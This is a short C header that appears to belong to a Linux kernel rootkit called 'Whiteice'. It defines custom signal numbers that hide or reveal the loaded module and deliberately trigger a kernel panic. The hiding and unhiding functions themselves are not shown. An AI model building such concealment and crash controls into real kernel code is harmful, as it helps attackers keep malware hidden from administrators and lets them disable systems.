#ifndef __SIGNALS_H
#define __SIGNALS_H

#include <linux/signal.h>

#define SIGMAGIC_HIDE   35
#define SIGMAGIC_UNHIDE 36
#define SIGMAGIC_PANIC  37

static inline void handle_signal(int sig) {
    switch (sig) {
        case SIGMAGIC_HIDE:
            hide_module();
            break;
        case SIGMAGIC_UNHIDE:
            show_module();
            break;
        case SIGMAGIC_PANIC:
            panic("Whiteice triggered panic (SIGMAGIC_PANIC)\n");
            break;
        default:
            break;
    }
}

#endif
